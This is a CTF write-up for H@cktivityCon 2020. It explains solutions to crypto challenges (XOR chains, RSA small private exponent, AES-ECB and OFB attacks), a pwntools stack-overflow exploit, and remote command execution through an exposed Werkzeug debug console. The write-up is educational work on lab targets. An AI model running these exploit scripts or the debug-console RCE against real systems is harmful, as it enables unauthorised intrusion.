# **H@cktivityCon CTF 2020**

<div align='center'>
  <img width=500 src='assets//images//logo.gif'>
</div>

This is my writeup for the challenges in H@cktivityCon CTF 2020, I'll try adding as many challenges as I can during the next few days starting with the web challenges.

***

# Table of Content
* [Cryptography](#cryptography)
  - [Tyrannosaurus Rex](#tyrannosaurus-rex)
  - [Perfect XOR](#perfect-xor)
  - [Bon Appetit](#bon-appetit)
  - [A E S T H E T I C](#a-e-s-t-h-e-t-i-c)
  - [OFBuscated](#ofbuscated)
* [Binary Exploitation](#binary-exploitation)
  - [Pancakes](#pancakes)
* [Web](#web)
  - [Ladybug](#ladybug)
  - [Bite](#bite)
  - [GI Joe](#gi-joe)
  - [Waffle Land](#waffle-land)
  - [Lightweight Contact Book](#lightweight-contact-book)
  - [Template Shack](#template-shack)

***

# Cryptography

## Tyrannosaurus Rex
We found this fossil. Can you reverse time and bring this back to life?

Download the file below.\
[fossil](assets//scripts//fossil)

**`flag{tyrannosauras_xor_in_reverse}`**

**Solution:** With the challenge we get a file named fossil, running the `file` command reveals that this file is actually a python script:

```python
#!/usr/bin/env python

import base64
import binascii

h = binascii.hexlify
b = base64.b64encode

c = b'37151032694744553d12220a0f584315517477520e2b3c226b5b1e150f5549120e5540230202360f0d20220a376c0067'

def enc(f):
    e = b(f)
    z = []
    i = 0
    while i < len(e):
        z += [ e[i] ^ e[((i + 1) % len(e))]]
        i = i + 1
    c = h(bytearray(z))
    return c
```

This script contains a function called enc which is seemingly an encryption scheme and a variable c which we can guess is the product of running the function enc on the flag, so we may need to implement a decryption scheme matching the given encryption scheme, for my sanity let's first deobfuscate the code a bit:

```python
#!/usr/bin/env python

import base64
import binascii

cipher = b'37151032694744553d12220a0f584315517477520e2b3c226b5b1e150f5549120e5540230202360f0d20220a376c0067'

def encyption(flag):
    encoded = base64.b64encode(flag)
    z = []
    for i in range(len(encoded))
        z += [ encoded[i] ^ encoded[((i + 1) % len(encoded))]]
    c = binascii.hexlify(bytearray(z))
    return c
```
Much better, now that we can actually read the code let's see what it does, the function enc first encodes the string to base64, then iterates over each character and xors each one with the one after it (the last character is xorred with the first), the bytes received by xorring are placed in an array and the array is encoded to hex.

We can break it down to 3 parts: base64 encoding, cyclic xorring and hex encoding, the first and the last are easy to reverse as the modules used for this parts have the reverse functions, but the second part is trickier.

We can notice something interesting with the encryption in the second part, if we think of the first character as the initialization vector, then the encryption is similar to encryption with Cipher Block Chaining (CBC) mode of operation with no block cipher (the block cipher is an identity function) and a block size of one, Cipher Block Chaining or CBC is a block cipher mode of operation, modes of operation split the plaintext into blocks of a size manageable by a cipher (for example AES works with blocks of sizes 128, 192 and 256 bits) and append the resulting ciphertext blocks together, a schema of the operation of CBC:

<div align=center>
  <img src='assets//images//fossil_1.png' style="background-color:white;" >
</div>


So in our case because there is no block cipher so no key the only value needed for decryption is the initialization vector or in other words the only thing that we miss on order to encrypt the whole ciphertext is the first letter....so we can just bruteforce it!

For those who didn't understand my reasoning, if we know the first character we can xor it with the first character of the ciphertext to get the second character in the plaintext (by the properties of xor for values a,b we get that a ^ b ^ b = a and the first character in the cipher text is the first character in the plaintext xorred with the second character in the plaintext), by using the second character we can get the third character doing the same operations and so on until we have decrypted all the ciphertext.

for that I wrote the following script which goes through all the character in base64 and for each one tries to decrypt the message as if it's the first character in the plaintext:

```python
#!/usr/bin/env python

import base64
import binascii
import string

def dec(f):
	# part 3 - hex
	z = binascii.unhexlify(f)
	# part 2 - cyclic xorring (CBC)
	for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '/+=':
		e = bytearray([ord(c)])
		for i in range(len(z) - 1):
			e += bytearray([z[i] ^ e[i]])
		# part 3 - base64
		try:
			p = base64.b64decode(e)
			# checks if the flag is in the plaintext
			if b'flag' in p:
				print(c, p.decode('utf-8'))
		except:
			continue
```

and by running this script we get the flag:

![](assets//images//fossil_2.png)

**Resources:**
* Block Cipher: https://en.wikipedia.org/wiki/Block_cipher
* Block Cipher modes of operation and CBC: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation

## Perfect XOR
Can you decrypt the flag?

Download the file below.\
[decrypt.py](assets//scripts//decrypt.py)

**`flag{tHE_br0kEN_Xor}`**

**Solution:** with the challenge we get a python script:

```python
import base64
n = 1
i = 0
cipher_b64 = b"MTE0LDg0LDQzNyw4MDk1LDMzNTUwNDM0LDg1ODk4NjkxNzAsMTM3NDM4NjkxMzc2LDIzMDU4NDMwMDgxMzk5NTIyMzUsMjY1ODQ1NTk5MTU2OTgzMTc0NDY1NDY5MjYxNTk1Mzg0MjI0NSwxOTE1NjE5NDI2MDgyMzYxMDcyOTQ3OTMzNzgwODQzMDM2MzgxMzA5OTczMjE1NDgxNjkyOTQsMTMxNjQwMzY0NTg1Njk2NDgzMzcyMzk3NTM0NjA0NTg3MjI5MTAyMjM0NzIzMTgzODY5NDMxMTc3ODM3MjgyMjMsMTQ0NzQwMTExNTQ2NjQ1MjQ0Mjc5NDYzNzMxMjYwODU5ODg0ODE1NzM2Nzc0OTE0NzQ4MzU4ODkwNjYzNTQzNDkxMzExOTkxNTIyMTYsMjM1NjI3MjM0NTcyNjczNDcwNjU3ODk1NDg5OTY3MDk5MDQ5ODg0Nzc1NDc4NTgzOTI2MDA3MTAxNDMwMjc1OTc1MDYzMzcyODMxNzg2MjIyMzk3MzAzNjU1Mzk2MDI2MDA1NjEzNjAyNTU1NjY0NjI1MDMyNzAxNzUwNTI4OTI1NzgwNDMyMTU1NDMzODI0OTg0Mjg3NzcxNTI0MjcwMTAzOTQ0OTY5MTg2NjQwMjg2NDQ1MzQxMjgwMzM4MzE0Mzk3OTAyMzY4Mzg2MjQwMzMxNzE0MzU5MjIzNTY2NDMyMTk3MDMxMDE3MjA3MTMxNjM1Mjc0ODcyOTg3NDc0MDA2NDc4MDE5Mzk1ODcxNjU5MzY0MDEwODc0MTkzNzU2NDkwNTc5MTg1NDk0OTIxNjA1NTU2NDcwODcsMTQxMDUzNzgzNzA2NzEyMDY5MDYzMjA3OTU4MDg2MDYzMTg5ODgxNDg2NzQzNTE0NzE1NjY3ODM4ODM4Njc1OTk5OTU0ODY3NzQyNjUyMzgwMTE0MTA0MTkzMzI5MDM3NjkwMjUxNTYxOTUwNTY4NzA5ODI5MzI3MTY0MDg3NzI0MzY2MzcwMDg3MTE2NzMxMjY4MTU5MzEzNjUyNDg3NDUwNjUyNDM5ODA1ODc3Mjk2MjA3Mjk3NDQ2NzIzMjk1MTY2NjU4MjI4ODQ2OTI2ODA3Nzg2NjUyODcwMTg4OTIwODY3ODc5NDUxNDc4MzY0NTY5MzEzOTIyMDYwMzcwNjk1MDY0NzM2MDczNTcyMzc4Njk1MTc2NDczMDU1MjY2ODI2MjUzMjg0ODg2MzgzNzE1MDcyOTc0MzI0NDYzODM1MzAwMDUzMTM4NDI5NDYwMjk2NTc1MTQzMzY4MDY1NTcwNzU5NTM3MzI4MjQy"

def a(n):
    b = 0
    for i in range(1, n):
        if(n % i == 0):
            b += i
    return b == n

print("flag{", end='', flush=True)
cipher = base64.b64decode(cipher_b64).decode().split(",")
while(i < len(cipher)):
    if (a(n)):
        print(chr(int(cipher[i]) ^ n), end='', flush=True)
        i += 1
    n+=1

print("}")
```

by the name of the file we can infer that the code purpose is to decrypt the ciphertext stored in cipher_b64 and hopefully print the flag, but it seems a little bit slow...

![](assets//images//perfect_1.gif)

at this point it's somewhat stop printing characters but still runs.\
This challenge is quite similar to a challenge in nahamCon CTF called Homecooked (make sense as it's the same organizers), in it there was an inefficient primality check that made the code unreasonably slow, so we might be up against something like that, let's look at the code, it first prints the start of the flag format, then it decodes the ciphertext and splits in into an array of strings, then for each string it tries to find a value of n bigger than the one used previously that makes a return the Boolean value True (for the first string it just finds the first one bigger than zero that satisfy a) if the code discovered a matching n it then xors n with the string and prints the result, this part is coded somewhat efficient so let's move on to the function a itslef, looking at this a we see that for the argument n the function goes through all the numbers smaller than n and checks for each one if it divides n, if so it adds it to a running total, in the end the function check if the sum is equal to n and return True if so otherwise it returns False.

Basically a checks if the sum of the divisors of n is equal to n, numbers that satisfy this are often called perfect numbers and there are more efficient ways to find them, we have discovered that all even perfect numbers are of the form p * ( p + 1 ) / 2  where p is a Mersenne prime, which are primes of the form 2 ** q - 1 for some integer q, furthermore we still haven't discovered odd perfect numbers so all the perfect numbers known to us (and important to this challenge) are even perfect number, so I took a list of q's off the internet (the integers that make up Mersenne primes) and modified the code a bit so that instead of trying to find a perfect number it just uses the next Mersenne prime to create one (I also tried to find a formatted list of perfect numbers or of Mersenne primes themselves but didn't find any):

```python
import base64
from functools import reduce

mersenne = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457]


i = 0
cipher_b64 = b"MTE0LDg0LDQzNyw4MDk1LDMzNTUwNDM0LDg1ODk4NjkxNzAsMTM3NDM4NjkxMzc2LDIzMDU4NDMwMDgxMzk5NTIyMzUsMjY1ODQ1NTk5MTU2OTgzMTc0NDY1NDY5MjYxNTk1Mzg0MjI0NSwxOTE1NjE5NDI2MDgyMzYxMDcyOTQ3OTMzNzgwODQzMDM2MzgxMzA5OTczMjE1NDgxNjkyOTQsMTMxNjQwMzY0NTg1Njk2NDgzMzcyMzk3NTM0NjA0NTg3MjI5MTAyMjM0NzIzMTgzODY5NDMxMTc3ODM3MjgyMjMsMTQ0NzQwMTExNTQ2NjQ1MjQ0Mjc5NDYzNzMxMjYwODU5ODg0ODE1NzM2Nzc0OTE0NzQ4MzU4ODkwNjYzNTQzNDkxMzExOTkxNTIyMTYsMjM1NjI3MjM0NTcyNjczNDcwNjU3ODk1NDg5OTY3MDk5MDQ5ODg0Nzc1NDc4NTgzOTI2MDA3MTAxNDMwMjc1OTc1MDYzMzcyODMxNzg2MjIyMzk3MzAzNjU1Mzk2MDI2MDA1NjEzNjAyNTU1NjY0NjI1MDMyNzAxNzUwNTI4OTI1NzgwNDMyMTU1NDMzODI0OTg0Mjg3NzcxNTI0MjcwMTAzOTQ0OTY5MTg2NjQwMjg2NDQ1MzQxMjgwMzM4MzE0Mzk3OTAyMzY4Mzg2MjQwMzMxNzE0MzU5MjIzNTY2NDMyMTk3MDMxMDE3MjA3MTMxNjM1Mjc0ODcyOTg3NDc0MDA2NDc4MDE5Mzk1ODcxNjU5MzY0MDEwODc0MTkzNzU2NDkwNTc5MTg1NDk0OTIxNjA1NTU2NDcwODcsMTQxMDUzNzgzNzA2NzEyMDY5MDYzMjA3OTU4MDg2MDYzMTg5ODgxNDg2NzQzNTE0NzE1NjY3ODM4ODM4Njc1OTk5OTU0ODY3NzQyNjUyMzgwMTE0MTA0MTkzMzI5MDM3NjkwMjUxNTYxOTUwNTY4NzA5ODI5MzI3MTY0MDg3NzI0MzY2MzcwMDg3MTE2NzMxMjY4MTU5MzEzNjUyNDg3NDUwNjUyNDM5ODA1ODc3Mjk2MjA3Mjk3NDQ2NzIzMjk1MTY2NjU4MjI4ODQ2OTI2ODA3Nzg2NjUyODcwMTg4OTIwODY3ODc5NDUxNDc4MzY0NTY5MzEzOTIyMDYwMzcwNjk1MDY0NzM2MDczNTcyMzc4Njk1MTc2NDczMDU1MjY2ODI2MjUzMjg0ODg2MzgzNzE1MDcyOTc0MzI0NDYzODM1MzAwMDUzMTM4NDI5NDYwMjk2NTc1MTQzMzY4MDY1NTcwNzU5NTM3MzI4MjQy"


print("flag{", end='', flush=True)
cipher = base64.b64decode(cipher_b64).decode().split(",")
while(i < len(cipher)):

		p = 2 ** (mersenne[i] - 1) * (2 ** mersenne[i] - 1)
		print(chr(int(cipher[i]) ^ p),end='', flush=True)
		i += 1

print("}")
```

And by running this more efficient code we get the flag in no time:

![](assets//images//perfect_2.gif)

**Resources:**
* Perfect Number: https://en.wikipedia.org/wiki/Perfect_number
* Mersenne Prime: https://en.wikipedia.org/wiki/Mersenne_prime
* The list I used: https://www.math.utah.edu/~pa/math/mersenne.html#:~:text=p%20%3D%202%2C%203%2C%205,%2C%2024036583%2C%2025964951%2C%2030402457

## Bon Appetit
Wow, look at the size of that! There is just so much to eat!

Download the file below.\
[prompt.txt](assets//files//prompt.txt)

**Post-CTF Writeup**\
**`flag{bon_appetit_that_was_one_big_meal}`**

**Solution:** With the challenge we get a text file with the following content:

```
n = 86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619

e = 43593315545590924566741189956390609253174017258933397294791907025439424425774036889638411588405163282027748339397612059157433970580764560513322386317250465583343254411506953895016705520492303066099891805233630388103484393657354623514864187319578938539051552967682959449373268200012558801313113531016410903723

c = 6017385445033775122298094219645257172271491520435372858165807340335108272067850311951631832540055908237902072239439990174700038153658826905580623598761388867106266417340542206012950531616502674237610428277052393911078615817819668756516229271606749753721145798023983027473008670407713937202613809743778378902
```

This is obviously an RSA encryption with n being the modulus, e being the public exponent and c being a ciphertext, as I explained in previous challenges:

> ... RSA is a public key cipher, which means that there are two keys, one that is public which is used to encrypt data, and one that is private which is used to decrypt data, obviously there is some sort of connection between the keys but it is hard to reveal the private key from the public keys (and in this case vice versa), specifically in RSA in order to find the private key we need to solve the integer factorization problem, which is thought to be in NP/P (this is not important for the challenge), we will call our public key e and our private key d, they posses the following attribute - d multiply by e modulo the value of (p-1) * (q-1) which we will name from now phi, is equal to 1, we will call d the modular multiplicative inverse of e and e the modular multiplicative inverse of d, furthermore if we take a plaintext message pt and raise it to the power of d and then to the power of e modulo the value of p * q, which we will name n and will be commonly given to us instead of q and p, we will get pt again (to understand why it is needed to delve into modern algebra, if n is smaller than pt then obviously we will not get pt), now with that in mind we can talk about the cipher, encryption in this cipher is raising the plaintext pt to the power of the public key e mod the value of n, similarly, decryption is raising the ciphertext to the power of d mod n...

The common methods for breaking RSA is using a factor database that stores factors or using somewhat efficient algorithms and heuristics in order to factor the modulus n, both won't work with an n as big as that, so we need to use less common attack, notice the public exponent e, it's very big, almost as big as the modulus itself, we often use very small exponent such as 3 and 65537 (there's even a variant of RSA which uses 2 as the public exponent) so a usage of large public exponent is most likely an indication that the private exponent d is small.

For small private exponents there are 2 main attacks - Weiner's Attack and Boneh & Durfee's attack, the first attack is simpler and uses continued fraction to efficiently find d if d is smaller than modulus n to the power of 0.25, the later attack is much more complex relying on solving the small inverse problem efficiently to find d if d is smaller the modulus n to the power of 0.285 (or 0.292...the conclusions are inconclusive), after trying to use Weiner's attack and failing I succeeded in using Boneh & Durfee's attack.

Unfortunately I can't explain in details how this attack works because it requires a lot of preliminary knowledge but I'll add both the papers of Weiner and Boneh & Durfee about the attacks in the resources for those interested (I'll maybe add an explanation later on the small inverse problem and how it's connected), for this attack I used a sage script I found online, updated it to python 3 and changed the size of the lattice to 6 and the value of delta (the power of n) to 0.26 to guarantee that the key is found, the modified code is [linked here](assets//scripts//buneh_durfee.sage) if you want to try it yourself (link for an online sage interpreter is in the resources), by running this code we find the private key and using it to decrypt the ciphertext we get the flag:

![](assets//images//bon_appetit_1.png)

**Resources:**
* Weiner's attack: http://monge.univ-mlv.fr/~jyt/Crypto/4/10.1.1.92.5261.pdf
* Boneh & Durfee's attack: https://link.springer.com/content/pdf/10.1007%2F3-540-48910-X_1.pdf
* Script used: https://www.cryptologie.net/article/241/implementation-of-boneh-and-durfee-attack-on-rsas-low-private-exponents/
* Web Sage interpreter: https://sagecell.sagemath.org/


## A E S T H E T I C
I can't stop hearing MACINTOSH PLUS...

Connect here:\
`nc jh2i.com 50009`

**Post-CTF Writeup**\
**`flag{aes_that_ick_ecb_mode_lolz}`**

**Solution:** we are given a port on a server to connect to, when we connect we are prompted to give input:

![](assets//images//aesthetic_1.png)

btw if you don't see the image in the ASCII art maybe this will help:

![](assets//images//aesthetic_2.png)

By giving input to the server we get an hex string in return with the message that the flag is sprinkled to the end:

![](assets//images//aesthetic_3.png)

After a bit of fuzzing I discovered that giving an empty input we receive an hex string of length 64, for input of length between the range of 1 to 32 we receive an hex string of size 128 and for input with length bigger than 32 we get an hex string of length bigger than 128:

![](assets//images//aesthetic_4.png)

furthermore by giving input with a length of 32 the second half of the hex string received is exactly the same as the hex string received when entering an empty input, this coupled with the reference to the block cipher AES in the challenge title led me to the conclusion that the server is using AES-ECB (AES with Electronic Codebook mode of operation) to encrypt our message appended to the flag and padded, as I explained in my writeup for Tyrannosaurus Rex modes of operation are used to allow block ciphers, which are limited by design to only specific lengths of plaintext, to encrypt information of any length, this is done by splitting the data into blocks, encrypting each block separately and then appending the resulting ciphertexts blocks together, ECB mode of operation encrypt every block in isolation where other modes of operation perform more encryptions between blocks so that blocks with the same plaintext won't have the same ciphertext, but ECB don't do that - **ECB encrypts the same plaintexts to the same ciphertexts**, a schema of this mode:

<div align=center>
  <img src='assets//images//aesthetic_5.png' style="background-color:white;" >
</div>

so now that we know how the hex value is created we can use a nice attack that John Hammond showed in a [recent video](https://www.youtube.com/watch?v=f-iz_ZAS258).

Because we know that input of length higher than 32 gives us an output with 64 more characters we can assume that the plaintext (our input appended to the flag and padded) is split into blocks of 32 characters, so when our input is 32 characters long the first block in the ciphertext (first 64 characters in the ciphertext) is entirely our input and the second block in the ciphertext is the flag with the padding, and when our input is 31 characters long the first block in the ciphertext is our input with the first letter of the flag in the end.\
so we can use a string of 31 characters and iterate over all the characters and check if the first block in the ciphertext when the input is our string appended to this (so the block is entirely our input) is equal to the first block of the ciphertext when the input is only our string (so the block is our input and the first character of the flag), after finding the first letter we can do the same for the second letter now using a string of 30 appended to the discovered first letter and so on for all the latter using the discovered start of the flag as the end of the string, more formally:

![](assets//images//aesthetic_6.png)

for this attack I wrote the following code which does basically the same as I described, building the flag character by character:

```python
from pwn import *
import re
from string import ascii_lowercase, digits

s = remote('jh2i.com', 50009)
s.recvuntil("> ")

flag = ''

for i in range(1,33):
	s.sendline('a' * (32 - i))
	base_block = re.findall('[a-f0-9]{64}', s.recvuntil("> ").decode('utf-8'))[0][:64]
	for c in '_{}' + ascii_lowercase + digits:
		s.sendline('a' * (32 - i) + flag + c)
		block = re.findall('[a-f0-9]{128}', s.recvuntil("> ").decode('utf-8'))[0][:64]
		if block == base_block:
			flag = flag + c
			print(flag)
			break

s.close()
```
and running this script gives us the flag:

![](assets//images//aesthetic_7.png)

**Resources:**
* Block Cipher: https://en.wikipedia.org/wiki/Block_cipher
* Block Cipher modes of operation and ECB: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation


## OFBuscated
I just learned some lesser used AES versions and decided to make my own!

Connect here:\
`nc jh2i.com 50028`

[obfuscated.py](assets//scripts//ofbuscated.py)

**Post-CTF Writeup**\
**`flag{bop_it_twist_it_pull_it_lol}`**

**Solution:** With the challenge we are given a port on a server to connect to and a python script, let's start with the server, by connecting to it we get an hex string:

![](assets//images//obfuscated_1.png)

and by reconnecting we get a different one:

![](assets//images//obfuscated_2.png)

this doesn't give us a lot of information so let's look at the script:

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random
import os
import socketserver
import string
import threading
from time import *
import random
import time
import binascii

iv = #####REDACTED#####
key = #####REDACTED#####
flag = open("flag.txt", "rb").read().strip()

class Service(socketserver.BaseRequestHandler):

    def handle(self):
        assert len(flag) % 16 == 1
        blocks = self.shuffle(flag)
        ct = self.encrypt(blocks)
        self.send(binascii.hexlify(ct))

    def byte_xor(self, ba1, ba2):
        return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

    def encrypt(self, blocks):
        curr = iv
        ct = []
        cipher = AES.new(key, AES.MODE_ECB)
        for block in blocks:
            curr = cipher.encrypt(curr)
            ct.append(self.byte_xor(block, curr))
        return b''.join(ct)

    def shuffle(self, pt):
        pt = pad(pt, 16)
        pt = [pt[i: i + 16] for i in range(0, len(pt), 16)]
        random.shuffle(pt)
        return pt

    def send(self, string, newline=True):
        if type(string) is str:
            string = string.encode("utf-8")

        if newline:
            string = string + b"\n"
        self.request.sendall(string)

    def receive(self, prompt="> "):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(
    socketserver.ThreadingMixIn,
    socketserver.TCPServer,
    socketserver.DatagramRequestHandler,
):
    pass


def main():

    port = 3156
    host = "0.0.0.0"

    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True

    server_thread = threading.Thread(target=server.serve_forever)

    server_thread.daemon = True
    server_thread.start()

    print("Server started on " + str(server.server_address) + "!")

    # Now let the main thread just wait...
    while True:
        sleep(10)


if __name__ == "__main__":
    main()
```

From the main function we can assume that this is the script running on the port we get, but it doesn't seems to be important so let's get rid of it and while we at it remote the ThreadedService class and the receive function as there is no use to it:

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random
import os
import socketserver
import string
import threading
from time import *
import random
import time
import binascii

iv = #####REDACTED#####
key = #####REDACTED#####
flag = open("flag.txt", "rb").read().strip()

def handle():
	assert len(flag) % 16 == 1
	blocks = shuffle(flag)
	ct = encrypt(blocks)
	send(binascii.hexlify(ct))

def byte_xor(ba1, ba2):
	return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def encrypt(blocks):
	curr = iv
	ct = []
	cipher = AES.new(key, AES.MODE_ECB)
	for block in blocks:
		curr = cipher.encrypt(curr)
		ct.append(byte_xor(block, curr))
	return b''.join(ct)

def shuffle(pt):
	pt = pad(pt, 16)
	pt = [pt[i: i + 16] for i in range(0, len(pt), 16)]
	random.shuffle(pt)
	return pt

def send(string, newline=True):
	if type(string) is str:
		string = string.encode("utf-8")

	if newline:
		string = string + b"\n"
	request.sendall(string)

```

Our main function is handle, it start by asserting that the length of the flag modulo 16 is 1, so we now know that the length of the flag is 16 * k + 1 for some number k, then it invoke a function called shuffle, this function pads the flag to a length divided by 16, so the length after padding is 16 * (k + 1), notice that is uses the method pad from Crypto.Util.Padding, this method uses PKCS7 padding style by default which pads the length of the text to the end of it, so basically our flag is now padded with the number 16 * k + 1 to a length of 16 * (k + 1), afterwards the method splits the padded flag into blocks of size 16 and shuffles the blocks using random.shuffle, so overall after invoking shuffle we are an array of k + 1 blocks in a random order, where each block is a length 16 and a part of the flag padded with his length.

Afterwards, handle calls encrypt with the blocks as argument,  for each block the method encrypt well....encrypts iv using AES-ECB, xors it with the block and then append the result to an array, this type of encryption is actually AES-OFB or in other words AES in Output Feedback mode of operation (it seems the organizers really loves block cipher's modes of operation), so as I explained in the previous challenge modes of operation allows block cipher to encrypt data of any length by splitting the data into blocks and encrypting each one separately and in the end appending the ciphertext together, OFB is very interesting in that regard because the data itself is not encrypted by AES in any stage but the initialization vector or iv is, and then each encrypted block of iv is xorred with a block of the plaintext to create the ciphertext, because of this we can think of this mode of operation as a one time pad (OTP), this is because we can perform all the encryption of iv beforehand and only xor the whole plaintext with it while we need, and if you've know what is an OTP you probably can guess why this is bad, a schema of this mode:

![](assets//images//obfuscated_3.png)

after encryption the ciphertext created is hexified and sent.

So why this is bad? as I said this encryption is basically OTP where the key is the encrypted iv, it is unsafe to reuse keys with OTP encoding because if we one two ciphertext created by the same key c1 = m1 ^ k and c2 = m2 ^ k we can xor the ciphertext to get c1 ^ c2 = m1 ^ k ^ m2 ^ k = m1 ^ m2 and if furthermore by having a message and its encryption we can retrieve the key (this is called a known plaintext attack), but why is all this relevant to us? well, because we actually know what is the last block, but first let's find the length of plaintext, we can do that by just decoding the hex value with get from the server to bytes and counting the number of bytes, by doing so we find that the length of the plaintext is 48 meaning that 16 * ( k + 1 ) = 48 and k = 2, and so we now know that our flag has a length of 33 and the number of blocks in the encryption is 3, okay why we know the last block? simply because we know that it comprises of the last character of the flag, which is a curly brace `}`, and then padding using the number 33, and why this is bad? let's say we have a list of all the possible encryptions of the first block of ciphertext (there are exactly 3), let them be b1, b2 and b3, one of them is obviously an encryption of the block we know, let's say its b2, and all of them are encrypted by xorring the same value k, so if we xor every block with every other block and xor that we the block we know there must be 2 block of plaintext, that's because xorring b2 with its plaintext results with k, and xorring k with every other block will result with b1 and b3, so we've just discovered all the plaintext!

So I wrote the following code to perform the attack, the code reconnects to server until it has all the possible values of the first block, then it xors the values between themselves and between the known plaintext block and check if the result is a printable string (it's very unlikely we'll get a printable result which is not in the flag), if so it finds its position in the flag (using the flag format) and prints the result:

```python
from pwn import *
import binascii
from Crypto.Util.Padding import pad, unpad
from string import printable

def byte_xor(ba1, ba2):
	return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

# all possible combinations of plaintext blocks and encrypted IV
possible_ct_blocks = []

# the most likely third and final block
third_block = pad(b'a' * 32 + b'}', 16)[-16:]

# the flag
flag = [b'',b'', third_block]

# finds all the values of the first block in the ciphertext
while True:
	s = remote('jh2i.com', 50028)
	ct_block = binascii.unhexlify(s.recvline().decode('utf-8')[:-1])[:16]
  s.close()
	if ct_block not in possible_ct_blocks:
		possible_ct_blocks += [ct_block]
	if len(possible_ct_blocks) == 3:
		break

# decrypts the data using knowladge of the third block and the posibility of it being in every position
for j in range(3):
	xorred_block = bytes(byte_xor(possible_ct_blocks[j], possible_ct_blocks[(j + 1) % 3]))
	xorred_block = byte_xor(xorred_block, third_block)
	if all(chr(c) in printable for c in xorred_block):
		if b'flag' in xorred_block:
			flag[0] = xorred_block
		else:
			flag[1] = xorred_block


print(unpad(b''.join(flag), 16).decode('utf-8'))
```
and we got the flag:

![](assets//images//obfuscated_4.png)

**Resources:**
* Block Cipher: https://en.wikipedia.org/wiki/Block_cipher
* Block Cipher modes of operation and ECB: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
* One Time Pad (OTP): https://en.wikipedia.org/wiki/One-time_pad

***

# Binary Exploitation

**Note:** For all the binary exploitation challenges I'll be working with [IDA free](https://www.hex-rays.com/products/ida/support/download_freeware/) and [pwntools](http://docs.pwntools.com/en/stable/)

## Pancakes
How many flap-jacks are on your stack?

Connect with:\
`nc jh2i.com 50021`

[pancakes](assets//executables//pancakes)

**Post-CTF Writeup**\
**`flag{too_many_pancakes_on_the_stack}`**

**Solution:** With the challenge we are given an executable and a port on a server running this executable, by running this executable we can see that it asks for how many pancakes we want and then prints us a nice ASCII art of pancakes:

![](assets//images//pancakes_1.png)

Okay now that we know what the executable does, let's see what we up against, using pwn.ELF() we can see which defenses the executable uses:

<div align=center>
  <img src="assets//images//pancakes_2.png">
</div>


The executable doesn't use canaries to protect from buffer overflows so might be able to overflow the return address of a function and cause a segfault, let's try doing that:

![](assets//images//pancakes_3.png)

We got a segfault! if you've noticed to cause the segfault I used `cyclic`, cyclic is a tool from pwntools which create a string with a cyclic behavior, we can use this string in order to find the relative distance of important values on the stack from the start of the buffer, the command `cyclic -n 8 400` creates a cyclic string of length 400 with cyclic substrings of length 8, let's try that again but now while debugging with IDA, by placing a breakpoint at the retn command of the main function and looking at the value in the stack before the execution of the instruction we can get the relative distance from the return address:

![](assets//images//pancakes_4.png)

The value is `0x6161616161616174` or `aaaaaaat` in ASCII, we can lookup the position of this substring using the command `cyclic -n 8 -o taaaaaaa` notice that I wrote the string in reverse, that is because data is written to the stack from right to left in IDA, by running this command we get an offset of 152 from the start of the buffer, and we have a way to jump to any point in the executable by overflowing the stack right until the return address and then modifying the address to the one we choose, looking at the symbols we can see a function named secret_recipe, this function reads a file named flag.txt and then prints it's content to the screen:

![](assets//images//pancakes_5.png)

this function obviously prints the flag, so let's jump to it, so I wrote the following script in python using the pwn module, this script connects to the server or runs the executable, finds the address of the function secret_recipe and creates the matching payload so that the execution will return to this function after finishing with main,
then the script sends the payload as input and print the flag received from the server/executable:

```python
from pwn import *
import re

e = ELF('pancakes')
addr = p64(e.symbols['secret_recipe'])

local = False
if not local:
	s = remote('jh2i.com', 50021)
else:
	s = process('pancakes')

s.recv()
s.sendline(b'A' * 152 + addr)
response = s.recvall()
print(re.findall('flag{.*}', response.decode('utf-8'))[0])
s.close()
```

and in action:

![](assets//images//pancakes_6.png)

***

# Web

## Ladybug
Want to check out the new Ladybug Cartoon? It's still in production, so feel free to send in suggestions!

Connect here:\
http://jh2i.com:50018

**`flag{weurkzerg_the_worst_kind_of_debug}`**

**Solution:** With the challenge we are given a url to a website:

![](assets//images//ladybug_1.png)

The page seems pretty bare, there are some links to other pages in the website and an option to search the website or to contact ladybug using a form, I first tried checking if there's a XXS vulnerability in the contact page or a SQLi vulnerability / file inclusion vulnerability in the search option, that didn't seem to work, then I tried looking in the other pages in the hope that I'll discover something there, none of those seemed very interesting, but, their location in the webserver stood out to me, all of them are in the `film/` directory, the next logical step was to fuzz the directory, doing so I got an Error on the site:

![](assets//images//ladybug_2.png)

This is great because we now know that the site is in debugging mode (we could also infer that from the challenge description but oh well), also we now know that the site is using Flask as a web framework, Flask is a web framework which became very popular in recent years mostly due to it simplicity, the framework depends on a web server gateway interface (WSGI) library called Werkzeug, A WSGI is a calling convention for web servers to forward requests to web frameworks (in our case Flask).

Werkzeug also provides web servers with a debugger and a console to execute Python expression from, we can find this console by navigating to `/console`:

![](assets//images//ladybug_3.png)

From this console we can execute commands on the server (RCE), let's first see who are we on the server, I used the following commands for that:

```python
import subprocess;out = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
```

the command simply imports the subprocess library, creates a new process that executes `whoami` and prints the output of the command, by doing so we get:

![](assets//images//ladybug_4.png)

The command worked!, now we can execute `ls` to see which files are in our working directory, doing so we can see that there's a file called flag.txt in there, and by using `cat` on the file we get the flag:

![](assets//images//ladybug_5.png)

